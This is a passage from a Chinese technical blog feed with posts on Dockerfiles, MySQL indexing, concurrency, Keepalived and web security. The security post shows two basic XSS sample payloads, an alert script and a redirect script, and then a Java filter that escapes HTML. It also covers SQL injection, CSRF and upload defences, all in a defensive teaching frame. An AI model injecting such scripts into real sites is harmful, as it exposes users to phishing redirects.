title="第七章、Dockerfile语法与实战"></a>第七章、Dockerfile语法与实战</h1><h2 id="7-1、什么是Dockerfile"><a href="#7-1、什么是Dockerfile" class="headerlink" title="7.1、什么是Dockerfile"></a>7.1、什么是Dockerfile</h2><pre><code class="hljs java">Dockerfile 用于构建一个新的Docker镜像的脚本文件，是由一系列命令和参数构成的脚本构建新的镜像步骤：<span class="hljs-number">1</span>、编写Dockerfile文件<span class="hljs-number">2</span>、通过docker build命令生成新的镜像<span class="hljs-number">3</span>、通过docker run命令运行</code></pre><h2 id="7-2、Dockerfile语法规则"><a href="#7-2、Dockerfile语法规则" class="headerlink" title="7.2、Dockerfile语法规则"></a>7.2、Dockerfile语法规则</h2><ul><li>每条指令的保留字(关键字)都必须为大写字母且后面至少要有一个参数</li><li>执行顺序按从上往下执行</li><li>‘#’号用于注释</li><li>每条指令都会创建一个新的镜像层，并对镜像进行提交</li></ul><h2 id="7-3、Dockerfile-执行流程"><a href="#7-3、Dockerfile-执行流程" class="headerlink" title="7.3、Dockerfile 执行流程"></a>7.3、Dockerfile 执行流程</h2><ul><li>Docker 从基础镜像运行一个容器</li><li>执行每一条指定并对容器作出修改</li><li>执行类似 docker commit 的操作提交一个新的镜像层</li><li>docker 再基于刚提交的镜像运行一个新容器</li><li>执行 Dockerfile 中的下一条指令直到所有指令都执行完成</li></ul><h2 id="7-4、Dockerfile-常用指令"><a href="#7-4、Dockerfile-常用指令" class="headerlink" title="7.4、Dockerfile 常用指令"></a>7.4、Dockerfile 常用指令</h2><p>查询docker官网的镜像，已centos7为例  </p><pre><code class="hljs javas">FROM scratchADD centos-7-x86_64-docker.tar.xz &#x2F;LABEL \    org.label-schema.schema-version&#x3D;&quot;1.0&quot; \    org.label-schema.name&#x3D;&quot;CentOS Base Image&quot; \    org.label-schema.vendor&#x3D;&quot;CentOS&quot; \    org.label-schema.license&#x3D;&quot;GPLv2&quot; \    org.label-schema.build-date&#x3D;&quot;20200504&quot; \    org.opencontainers.image.title&#x3D;&quot;CentOS Base Image&quot; \    org.opencontainers.image.vendor&#x3D;&quot;CentOS&quot; \    org.opencontainers.image.licenses&#x3D;&quot;GPL-2.0-only&quot; \    org.opencontainers.image.created&#x3D;&quot;2020-05-04 00:00:00+01:00&quot;CMD [&quot;&#x2F;bin&#x2F;bash&quot;]</code></pre><table><thead><tr><th>指令(大写字母为保留字)</th><th><strong>作用</strong></th></tr></thead><tbody><tr><td><strong>FROM</strong> image_name:tag</td><td>基础镜像，基于哪个基础镜像启动构建流程</td></tr><tr><td><strong>MAINTAINER</strong> user_name</td><td>镜像的构建者的姓名和邮箱地址等</td></tr><tr><td><strong>COPY</strong> source_dir/file dest_dir/file</td><td>和ADD相似，但是如果有压缩文件并不能解压</td></tr><tr><td><strong>ADD</strong> source_dir/file dest_dir/file</td><td>将宿主机的文件复制到容器内，如果是压缩文件，将自动解压</td></tr><tr><td><strong>ENV</strong> key value</td><td>设置环境变量，可以写多条</td></tr><tr><td><strong>RUN</strong> command</td><td>是Dockerfile的核心部分，可以写多条，运行到当行，就指定该命令</td></tr><tr><td><strong>WORKDIR</strong> path_dir</td><td>设置工作目录，当创建容器后，命令终端默认登录目录，未指定则为/</td></tr><tr><td><strong>EXPOSE</strong> port</td><td>当前对外暴露的端口号，使容器内的应用可以通过端口和外界交互</td></tr><tr><td><strong>CMD</strong> argument</td><td>Dockerfile中可以有多个CMD，但是只有最后一个会生效。在构建容器时，会被 docker run 后面指定的参数覆盖</td></tr><tr><td><strong>ENTRYPOINT</strong> argument</td><td>和CMD相似，但是并不会被docker run指定的参数覆盖，而是追加参数</td></tr><tr><td><strong>VOLUME</strong></td><td>将宿主机文件夹挂载到容器中</td></tr></tbody></table><h2 id="7-5、Dockerfile构建镜像实战"><a href="#7-5、Dockerfile构建镜像实战" class="headerlink" title="7.5、Dockerfile构建镜像实战"></a>7.5、Dockerfile构建镜像实战</h2><p><strong>案例构建JDK</strong></p><ul><li><p>创建目录，将jdk包上传到指定目录</p></li><li><p>创建文件Dockerfile文件，并编辑文件</p><pre><code class="hljs java">#来自基础镜像FROM centos:<span class="hljs-number">7</span>  #指定镜像创建者信息MAINTAINER mengxuegu  #切换工作目录 /usr/localWORKDIR /usr/local  #创建一个存放jdk的路径RUN mkdir /usr/local/java  #将jdk压缩包复制并解压到容器中/usr/local/javaADD jdk-<span class="hljs-number">8</span>u171-linux-x64.tar.gz /usr/local/java  #配置java环境变量ENV JAVA_HOME /usr/local/java/jdk1.<span class="hljs-number">8.0_171</span>ENV JRE_HOME $JAVA_HOME/jreENV CLASSPATH $JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar:$JRE_HOME/lib:$CLASSPATHENV PATH $JAVA_HOME/bin:$PATH  CMD [<span class="hljs-string">&quot;/bin/bash&quot;</span>]</code></pre></li><li><p>docker build [-f 指定Dockerfile所在路径与文件名] -t 生成的镜像名:标签名 .</p><p>注意后边的 空格 和点 . 不要省略, . 表示当前目录<br>-f 指定Dockerfile文件所在路径与文件名。如果未指定 -f 值，则找当前目录下名为 Dockerfile 的构建文件</p></li></ul><h1 id="第八章、本地镜像发布到阿里云仓库"><a href="#第八章、本地镜像发布到阿里云仓库" class="headerlink" title="第八章、本地镜像发布到阿里云仓库"></a>第八章、本地镜像发布到阿里云仓库</h1><p>登录阿里云控制台，搜索<strong>容器镜像服务</strong>配置镜像仓库，可以根据操作指南进行操作</p>]]></content>
    
    
    <categories>
      
      <category>运维</category>
      
    </categories>
    
    
    <tags>
      
      <tag>docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Mysql底层知识总结</title>
    <link href="/2020/04/20/Mysql/"/>
    <url>/2020/04/20/Mysql/</url>
    
    <content type="html"><![CDATA[<h1 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h1><p>索引是帮助MySQL高效获取数据的排序好的数据结构</p><p>索引的数据结构有：二叉树、红黑树、Hash表、B-Tree</p><h1 id="一、数据结构"><a href="#一、数据结构" class="headerlink" title="一、数据结构"></a>一、数据结构</h1><h3 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h3><pre><code class="hljs java">二叉树：左子树的键值小于根的键值，右子树的键值大于根的键值。 不适合自增序列，自增序列的数据，变成二叉树后和链表差不多。</code></pre><p><a href="https://blog.csdn.net/hao65103940/article/details/89032538">https://blog.csdn.net/hao65103940/article/details/89032538</a></p><h3 id="红黑树"><a href="#红黑树" class="headerlink" title="红黑树"></a>红黑树</h3><pre><code class="hljs java">红黑树又叫二叉平衡树：如果数量过多，红黑树的高度会很高，查询也会很慢</code></pre><h3 id="B-Tree"><a href="#B-Tree" class="headerlink" title="B+ Tree"></a>B+ Tree</h3><pre><code class="hljs java">B+Tree:<span class="hljs-number">1</span>、非叶子节点不存储data，只存储索引(冗余)，可以放更多的索引<span class="hljs-number">2</span>、叶子节点包含所有索引字段<span class="hljs-number">3</span>、叶子节点用指针连接，提高区间访问的性能</code></pre>]]></content>
    
    
    <categories>
      
      <category>后端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>mysql</tag>
      
      <tag>数据结构</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Mysql优化集合</title>
    <link href="/2020/04/17/Mysql%E4%BC%98%E5%8C%96%E9%9B%86%E5%90%88/"/>
    <url>/2020/04/17/Mysql%E4%BC%98%E5%8C%96%E9%9B%86%E5%90%88/</url>
    
    <content type="html"><![CDATA[<h1 id="Mysql优化"><a href="#Mysql优化" class="headerlink" title="Mysql优化"></a>Mysql优化</h1><h2 id="1、索引字段上使用函数，导致索引失效。"><a href="#1、索引字段上使用函数，导致索引失效。" class="headerlink" title="1、索引字段上使用函数，导致索引失效。"></a>1、索引字段上使用函数，导致索引失效。</h2><pre><code class="hljs java">比如查询当天的数据：​select * <span class="hljs-function">from dm_h_calc where <span class="hljs-title">TO_DAYS</span><span class="hljs-params">(now()</span>) - <span class="hljs-title">TO_DAYS</span><span class="hljs-params">(gmt_create)</span> </span>= <span class="hljs-number">0</span>；修改后为：​select * from dm_h_calc where gmt_create &gt;= DATE_ADD(now(),INTERVAL -<span class="hljs-number">1</span> day)； **函数:DATE_ADD函数为时间格式，DATE_ADD(now(),INTERVAL -<span class="hljs-number">1</span> day)返回为减一天的时间</code></pre><p>​          </p><h2 id="2、关于索引的相关知识点"><a href="#2、关于索引的相关知识点" class="headerlink" title="2、关于索引的相关知识点"></a>2、关于索引的相关知识点</h2><h3 id="1-索引个数限制"><a href="#1-索引个数限制" class="headerlink" title="1.索引个数限制"></a>1.索引个数限制</h3><ul><li><p>索引是双刃剑，会增加维护负担，增大IO压力，索引占用空间是成倍增加的</p></li><li><p>单张表的索引数量控制在5个以内，或不超过表字段个数的20%。若单张表多个字段在查询需求上都要单独用到索引，需要经过DBA评估。</p></li></ul><h3 id="2-避免冗余索引"><a href="#2-避免冗余索引" class="headerlink" title="2.避免冗余索引"></a>2.避免冗余索引</h3><ul><li><p>InnoDB表是一棵索引组织表，主键是和数据放在一起的聚集索引，普通索引最终指向的是主键地址，所以把主键做最后一列是多余的。如f_crm_id作为主键，联合索引(f_user_id,f_crm_id)上的f_crm_id就完全多余</p></li><li><p>(a,b,c)、(a,b)，后者为冗余索引。可以利用前缀索引来达到加速目的，减轻维护负担</p></li></ul><h3 id="3-没有特殊要求，使用自增id作为主键"><a href="#3-没有特殊要求，使用自增id作为主键" class="headerlink" title="3.没有特殊要求，使用自增id作为主键"></a>3.没有特殊要求，使用自增id作为主键</h3><ul><li><p>主键是一种聚集索引，顺序写入。组合唯一索引作为主键的话，是随机写入，适合写少读多的表</p></li><li><p>主键不允许更新</p></li></ul><h3 id="4-索引尽量建在选择性高的列上"><a href="#4-索引尽量建在选择性高的列上" class="headerlink" title="4.索引尽量建在选择性高的列上"></a>4.索引尽量建在选择性高的列上</h3><ul><li><p>不在低基数列上建立索引，例如性别、类型。但有一种情况，idx_feedbackid_type (f_feedback_id,f_type)，如果经常用 f_type=1 比较，而且能过滤掉90%行，那这个组合索引就值得创建。有时候同样的查询语句，由于条件取值不同导致使用不同的索引，也是这个道理。</p></li><li><p>索引选择性计算方法（基数 ÷ 数据行数）<br>      Selectivity = Cardinality / Total Rows = select count(distinct col1)/count(*) from tbname，越接近1说明col1上使用索引的过滤效果越好</p></li><li><p>走索引扫描行数超过30%时，改全表扫描</p></li></ul><h3 id="5-最左前缀原则"><a href="#5-最左前缀原则" class="headerlink" title="5.最左前缀原则"></a>5.最左前缀原则</h3><ul><li><p>mysql使用联合索引时，从左向右匹配，遇到断开或者范围查询时，无法用到后续的索引列比如索引idx_c1_c2_c3(c1,c2,c3)，相当于创建了(c1)、(c1,c2)、(c1,c2,c3)三个索引，where条件包含上面三种情况的字段比较则可以用到索引，但像 where c1=a and c3=c 只能用到c1列的索引，像 c2=b and c3=c等情况就完全用不到这个索引</p></li><li><p>遇到范围查询(&gt;、&lt;、between、like)也会停止索引匹配，比如 c1=a and c2 &gt; 2 and c3=c，只有c1,c2列上的比较能用到索引，(c1,c2,c3)排列的索引才可能会都用上</p></li><li><p>where条件里面字段的顺序与索引顺序无关，mysql优化器会自动调整顺序</p></li></ul><h3 id="6-前缀索引"><a href="#6-前缀索引" class="headerlink" title="6.前缀索引"></a>6.前缀索引</h3><ul><li><p>对超过30个字符长度的列创建索引时，考虑使用前缀索引，如 idx_cs_guid2 (f_cs_guid(26))表示截取前26个字符做索引，既可以提高查找效率，也可以节省空间</p></li><li><p>前缀索引也有它的缺点是，如果在该列上 ORDER BY 或 GROUP BY 时无法使用索引，也不能把它们用作覆盖索引(Covering Index)</p></li><li><p>如果在varbinary或blob这种以二进制存储的列上建立前缀索引，要考虑字符集，括号里表示的是字节数</p></li></ul><h3 id="7-合理使用覆盖索引"><a href="#7-合理使用覆盖索引" class="headerlink" title="7.合理使用覆盖索引"></a>7.合理使用覆盖索引</h3><ul><li><p>INNODB存储引擎中，secondary index(非主键索引，又称为辅助索引、二级索引)没有直接存储行地址，而是存储主键值。</p></li><li><p>如果用户需要查询secondary index中所不包含的数据列，则需要先通过secondary index查找到主键值，然后再通过主键查询到其他数据列，因此需要查询两次。覆盖索引则可以在一个索引中获取所有需要的数据列，从而避免回表进行二次查找，节省IO因此效率较高。</p></li></ul><h3 id="8-最左前缀原则"><a href="#8-最左前缀原则" class="headerlink" title="8.最左前缀原则"></a>8.最左前缀原则</h3><ul><li>如不在定义了 ON UPDATE CURRENT_STAMP 的列上创建索引，维护成本太高（好在mysql有insert buffer，会合并索引的插入）</li></ul>]]></content>
    
    
    <categories>
      
      <category>后端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql优化</tag>
      
      <tag>企业级应用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>多线程</title>
    <link href="/2020/04/17/%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
    <url>/2020/04/17/%E5%A4%9A%E7%BA%BF%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h1><h3 id="一、什么是进程？什么是线程？"><a href="#一、什么是进程？什么是线程？" class="headerlink" title="一、什么是进程？什么是线程？"></a>一、什么是进程？什么是线程？</h3><pre><code class="hljs java">在一个应用程序中，都会有一个进程。进程中有多个不同的执行路径，也可以理解为多个线程的集合</code></pre>]]></content>
    
    
    <categories>
      
      <category>后端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>企业级应用</tag>
      
      <tag>多线程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>项目安全架构</title>
    <link href="/2020/04/17/%E9%A1%B9%E7%9B%AE%E5%AE%89%E5%85%A8%E6%9E%B6%E6%9E%84/"/>
    <url>/2020/04/17/%E9%A1%B9%E7%9B%AE%E5%AE%89%E5%85%A8%E6%9E%B6%E6%9E%84/</url>
    
    <content type="html"><![CDATA[<h1 id="项目安全架构"><a href="#项目安全架构" class="headerlink" title="项目安全架构"></a>项目安全架构</h1><p>​     根据目前业务架构，假设<strong>所有的数据输入和输出都是恶意的</strong>；从各个数据输入点进行安全分析；建立以下威胁模型:（先整体，然后细分业务方案）</p><pre><code class="hljs java"><span class="hljs-number">1</span>、Web安全常见攻击手段 XSS、SQL注入、防盗链、CSRF、上传漏洞<span class="hljs-number">2</span>、信息加密与漏洞扫描   对称加密、非对称加密<span class="hljs-number">3</span>、互联网API接口安全设计<span class="hljs-number">4</span>、网站安全漏洞扫描与抓包分析<span class="hljs-number">5</span>、Https协议底层原理分析<span class="hljs-number">6</span>、电子商务风控与黑名单和白名单系统<span class="hljs-number">7</span>、基于多种手段防御DDOS攻击<span class="hljs-number">8</span>、真实案例分析<span class="hljs-number">12306</span>分流抢票软件原理</code></pre><h1 id="一、XSS"><a href="#一、XSS" class="headerlink" title="一、XSS"></a>一、XSS</h1><h3 id="1、什么是XSS？"><a href="#1、什么是XSS？" class="headerlink" title="1、什么是XSS？"></a>1、什么是XSS？</h3><p>使用JavaScript语言攻击，提交js脚本语言内容，因为浏览器默认支持脚本语言执行，如何在表单提交的时候，提交一些脚本参数，可能浏览器会直接执行。</p><pre><code class="hljs java">&lt;script&gt;alert(&#x27;lafi&#x27;)&lt;/script&gt; &lt;script&gt;window.location.href=&#x27;http://www.baidu.com&#x27;;&lt;/script&gt; //跳转到钓鱼网站，钓鱼网站和原网站一样</code></pre><h3 id="2、XSS攻击应用场景"><a href="#2、XSS攻击应用场景" class="headerlink" title="2、XSS攻击应用场景"></a>2、XSS攻击应用场景</h3><pre><code class="hljs java">论坛、社交、评论区 存在表单提交的地方都有可能遭受XSS攻击</code></pre><h3 id="3、如何防御XSS攻击"><a href="#3、如何防御XSS攻击" class="headerlink" title="3、如何防御XSS攻击"></a>3、如何防御XSS攻击</h3><pre><code class="hljs java">将&lt; &gt; 这种字符进行特殊字符转义例如：&lt;&gt; 转义后为 &amp;lt;script&amp;gt;</code></pre><pre><code class="hljs java">引入jar包        &lt;!--工具类--&gt;        &lt;dependency&gt;            &lt;groupId&gt;commons-lang&lt;/groupId&gt;            &lt;artifactId&gt;commons-lang&lt;/artifactId&gt;            &lt;version&gt;2.6&lt;/version&gt;        &lt;/dependency&gt;          <span class="hljs-keyword">import</span> org.apache.commons.lang.StringEscapeUtils;<span class="hljs-keyword">import</span> org.springframework.util.StringUtils;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequestWrapper;<span class="hljs-comment">/**</span><span class="hljs-comment"> * <span class="hljs-doctag">@ClassName</span> XssFilter</span><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> todo Xss过滤器 urlPatterns配置过滤路径</span><span class="hljs-comment"> * <span class="hljs-doctag">@Author</span> lu</span><span class="hljs-comment"> * <span class="hljs-doctag">@Date</span> 2020/4/17</span><span class="hljs-comment"> * <span class="hljs-doctag">@Version</span> 1.0</span><span class="hljs-comment"> */</span><span class="hljs-meta">@WebFilter(filterName = &quot;xssFilter&quot;, urlPatterns = &#123;&quot;/api/v1/test/xss&quot;, &quot;/api/v1/test2/xss&quot;&#125;)</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">XssFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Filter</span> </span>&#123;    <span class="hljs-meta">@Override</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException </span>&#123;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doFilter</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException </span>&#123;        System.out.println(<span class="hljs-string">&quot;进入Xss过滤器&quot;</span>);        HttpServletRequest request = (HttpServletRequest) servletRequest;        XssHttpServletRequestWrapper xssHttpServletRequestWrapper = <span class="hljs-keyword">new</span> XssHttpServletRequestWrapper(request);        filterChain.doFilter(xssHttpServletRequestWrapper, servletResponse);    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">destroy</span><span class="hljs-params">()</span> </span>&#123;    &#125;&#125;<span class="hljs-keyword">import</span> org.apache.commons.lang.StringEscapeUtils;<span class="hljs-keyword">import</span> org.springframework.util.StringUtils;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequestWrapper;<span class="hljs-comment">/**</span><span class="hljs-comment"> * <span class="hljs-doctag">@ClassName</span> XssHttpServletRequestWrapper</span><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> todo 过滤请求参数中特殊字符</span><span class="hljs-comment"> * <span class="hljs-doctag">@Author</span> lu</span><span class="hljs-comment"> * <span class="hljs-doctag">@Date</span> 2020/4/17</span><span class="hljs-comment"> * <span class="hljs-doctag">@Version</span> 1.0</span><span class="hljs-comment"> */</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">XssHttpServletRequestWrapper</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServletRequestWrapper</span> </span>&#123;    <span class="hljs-keyword">private</span> HttpServletRequest request;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">XssHttpServletRequestWrapper</span><span class="hljs-params">(HttpServletRequest request)</span> </span>&#123;        <span class="hljs-keyword">super</span>(request);        <span class="hljs-keyword">this</span>.request = request;    &#125;    <span class="hljs-comment">// 处理单个参数</span>    <span class="hljs-meta">@Override</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getParameter</span><span class="hljs-params">(String name)</span> </span>&#123;        System.out.println(name);        String value = request.getParameter(name);        <span class="hljs-keyword">if</span> (!StringUtils.isEmpty(value)) &#123;            value = StringEscapeUtils.escapeHtml(value);        &#125;        System.out.println(value);        <span class="hljs-keyword">return</span> value;    &#125;    <span class="hljs-comment">// 处理多个参数</span>    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> String[] getParameterValues(String name) &#123;        String[] parameterValues = <span class="hljs-keyword">super</span>.getParameterValues(name);        <span class="hljs-keyword">if</span> (parameterValues == <span class="hljs-keyword">null</span>) &#123;            <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;        &#125;        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; parameterValues.length; i++) &#123;            String value = parameterValues[i];            parameterValues[i] = StringEscapeUtils.escapeHtml(value);        &#125;        <span class="hljs-keyword">return</span> parameterValues;    &#125;&#125;</code></pre><h1 id="二、SQL注入"><a href="#二、SQL注入" class="headerlink" title="二、SQL注入"></a>二、SQL注入</h1><h3 id="1、什么是sql注入"><a href="#1、什么是sql注入" class="headerlink" title="1、什么是sql注入"></a>1、什么是sql注入</h3><pre><code class="hljs java">利用现有应用程序，将（恶意）的SQL命令注入到后台数据库执行一些恶意的操作。造成SQL注入的原因是因为程序没有有效过滤用户的输入，使攻击者成功的向服务器提交恶意的SQL查询代码，程序在接收后错误的将攻击者的输入作为查询语句的一部分执行，导致原始的查询逻辑被改变，额外的执行了攻击者精心构造的恶意代码</code></pre><h3 id="2、sql注入防攻击手段"><a href="#2、sql注入防攻击手段" class="headerlink" title="2、sql注入防攻击手段"></a>2、sql注入防攻击手段</h3><pre><code class="hljs pgsql">不要使用拼接<span class="hljs-keyword">SQL</span>语句方式、最好使用预编译方式，在mybatis编写<span class="hljs-keyword">sql</span>语句的时候，最好使用?传参数方式，不要使用#传参数，因为#传参数方式，可能会受到<span class="hljs-keyword">sql</span>语句攻击。</code></pre><pre><code class="hljs java">使用mybatis时：#&#123;&#125;: 解析为一个 JDBC 预编译语句（prepared statement）的参数标记符，一个 #&#123; &#125; 被解析为一个参数占位符,可以防止SQL注入问题。$&#123;&#125;: 仅仅为一个纯碎的 string 替换，在动态 SQL 解析阶段将会进行变量替换。</code></pre><h1 id="三、防盗链"><a href="#三、防盗链" class="headerlink" title="三、防盗链"></a>三、防盗链</h1><h3 id="1、什么是防盗链"><a href="#1、什么是防盗链" class="headerlink" title="1、什么是防盗链"></a>1、什么是防盗链</h3><pre><code class="hljs java">限制资源只能在某服务器(域名)进行访问。项目一的图片，项目二是不能通过项目一的路径进行访问的，防止盗用。(不能远程引用的)如果频繁访问，会导致自己的宽带上升。  可以利用referer字段来实现 白名单 黑名单功能</code></pre><h3 id="2、如何设置防盗链"><a href="#2、如何设置防盗链" class="headerlink" title="2、如何设置防盗链"></a>2、如何设置防盗链</h3><pre><code class="hljs java">使用Http协议中 请求头(RequestHeaders) 中 Referer 字段 判断请求来源<span class="hljs-number">1</span>、使用过滤器获取请求头中RefererString referer = req.getHeader(<span class="hljs-string">&quot;Referer&quot;</span>);<span class="hljs-number">2</span>、截取referer域名，进行判断</code></pre><h1 id="四、接口幂等性问题"><a href="#四、接口幂等性问题" class="headerlink" title="四、接口幂等性问题"></a>四、接口幂等性问题</h1><h3 id="1、什么是幂等性问题"><a href="#1、什么是幂等性问题" class="headerlink" title="1、什么是幂等性问题"></a>1、什么是幂等性问题</h3><pre><code class="hljs java">由于重复点击、网络延迟、或者模拟请求，导致重复提交问题，例如订单重复提交</code></pre><h3 id="2、如何防止幂等问题"><a href="#2、如何防止幂等问题" class="headerlink" title="2、如何防止幂等问题"></a>2、如何防止幂等问题</h3><pre><code class="hljs java"><span class="hljs-number">1</span>、使用乐观锁 sql中的version字段<span class="hljs-number">2</span>、sql中唯一索引特性<span class="hljs-number">3</span>、使用Token令牌方式 【推荐】   以创建订单为例，每次下订单时提前获取Token，然后将Redis中的Token删除</code></pre><h3 id="3、如何防止伪造Token请求"><a href="#3、如何防止伪造Token请求" class="headerlink" title="3、如何防止伪造Token请求"></a>3、如何防止伪造Token请求</h3><pre><code class="hljs java">验证客户端的合法性(比如说google的二步验证、短信验证码保证合法客户端的会话安全（https）token加时间戳验证</code></pre><h1 id="五、CSRF-跨站域请求伪造攻击"><a href="#五、CSRF-跨站域请求伪造攻击" class="headerlink" title="五、CSRF 跨站域请求伪造攻击"></a>五、CSRF 跨站域请求伪造攻击</h1><h3 id="1、什么是CSRF"><a href="#1、什么是CSRF" class="headerlink" title="1、什么是CSRF"></a>1、什么是CSRF</h3><pre><code class="hljs java">模拟请求，和XSS攻击一样，存在巨大的危害性攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等。</code></pre><h3 id="2、如何防御CSRF"><a href="#2、如何防御CSRF" class="headerlink" title="2、如何防御CSRF"></a>2、如何防御CSRF</h3><pre><code class="hljs java"><span class="hljs-number">1</span>、使用图形验证码防止机器模拟接口请求攻击，在调用核心业务接口时，比如支付、下单、等接口，最好使用手机短信验证验证或者是人脸识别，防止其他用户使用Token伪造请求。<span class="hljs-number">2</span>、Nginx实现限流、配置黑名单和白名单<span class="hljs-number">3</span>、验证HTTP Referer字段</code></pre><h1 id="六、上传文件漏洞"><a href="#六、上传文件漏洞" class="headerlink" title="六、上传文件漏洞"></a>六、上传文件漏洞</h1><h3 id="1、什么是上传文件漏洞"><a href="#1、什么是上传文件漏洞" class="headerlink" title="1、什么是上传文件漏洞"></a>1、什么是上传文件漏洞</h3><pre><code class="hljs java">上传文件中包含了违法、恶意代码，比如删除文件、读取本地文件信息等。</code></pre><h3 id="2、如何防御上传文件漏洞"><a href="#2、如何防御上传文件漏洞" class="headerlink" title="2、如何防御上传文件漏洞"></a>2、如何防御上传文件漏洞</h3><pre><code class="hljs java">判断文件流的方式为图片或视频等，只判断后缀是不可行的。限制上传.class .jsp .exe 类型文件</code></pre>]]></content>
    
    
    <categories>
      
      <category>后端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>企业级应用</tag>
      
      <tag>安全</tag>
      
      <tag>XSS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>高并发解决方案大纲</title>
    <link href="/2020/04/17/%E9%AB%98%E5%B9%B6%E5%8F%91%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%E5%A4%A7%E7%BA%B2/"/>
    <url>/2020/04/17/%E9%AB%98%E5%B9%B6%E5%8F%91%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%E5%A4%A7%E7%BA%B2/</url>
    
    <content type="html"><![CDATA[<h3 id="高并发解决方案"><a href="#高并发解决方案" class="headerlink" title="高并发解决方案"></a>高并发解决方案</h3><p>今天整理了一下高并发的解决方案，随后我会逐步写博客进行详解。</p><p>1、数据库</p><pre><code class="hljs java">慢查询定位sql语句sql语句优化减少全表扫描使用索引分表分库水平 取模算法主从复制(mysql集群)二进制日志文件读写分离</code></pre><p>2、缓存机制</p><pre><code class="hljs java">使用redis缓存数据库内容redis集群（主从复制）redis读写分离redis哨兵机制监听</code></pre><p>3、服务器</p><pre><code class="hljs java">反向代理、配置负载均衡、集群、动静分离</code></pre><p>4、客户端</p><pre><code class="hljs java">减少请求动静分离CDN加速 （多个地区进行部署，从近访问服务器）</code></pre><p>5、项目优化</p><pre><code class="hljs java">代码重构JVM调优 垃圾回收机制 老年代、新生代。配置JVM参数配置垃圾回收机制算法项目采用微服务和分布式架构</code></pre>]]></content>
    
    
    <categories>
      
      <category>高并发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>企业级应用</tag>
      
      <tag>高并发</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Nginx+Keepalived 高可用</title>
    <link href="/2020/04/16/Nginx+Keepalived%20%E9%AB%98%E5%8F%AF%E7%94%A8/"/>
    <url>/2020/04/16/Nginx+Keepalived%20%E9%AB%98%E5%8F%AF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="Nginx-Keepalived-高可用"><a href="#Nginx-Keepalived-高可用" class="headerlink" title="Nginx+Keepalived 高可用"></a>Nginx+Keepalived 高可用</h1><h3 id="1、什么是Keepalived？"><a href="#1、什么是Keepalived？" class="headerlink" title="1、什么是Keepalived？"></a>1、什么是Keepalived？</h3><pre><code class="hljs java">keepalived是为管理管理中保证能够提供高可用的一个服务软件，其功能称为心跳，可以防止单点故障。</code></pre><h3 id="2、Keepalived安装"><a href="#2、Keepalived安装" class="headerlink" title="2、Keepalived安装"></a>2、Keepalived安装</h3><p><strong>每个Nginx下都要安装Keepalived</strong></p><pre><code class="hljs java"><span class="hljs-number">1</span>、下载地址：http:<span class="hljs-comment">//www.keepalived.org/download.html</span><span class="hljs-number">2</span>、cd /usr/local<span class="hljs-number">3</span>、tar -zxvf keepalived-<span class="hljs-number">1.2</span>.<span class="hljs-number">18.</span>tar.gz <span class="hljs-number">4</span>、cd keepalived-<span class="hljs-number">1.2</span>.<span class="hljs-number">18</span><span class="hljs-number">5</span>、安装软件包 yum install -y openssl openssl-devel<span class="hljs-number">6</span>、./configure --prefix=/usr/local/keepalived<span class="hljs-number">7</span>、make &amp;&amp; make install</code></pre><h3 id="3、Keepalived安装成Linux系统服务"><a href="#3、Keepalived安装成Linux系统服务" class="headerlink" title="3、Keepalived安装成Linux系统服务"></a>3、Keepalived安装成Linux系统服务</h3><pre><code class="hljs java"><span class="hljs-number">1</span>、将keepalived安装成Linux系统服务，因为没有使用keepalived的默认安装路径（默认路径：/usr/local）,安装完成之后，需要做一些修改工作<span 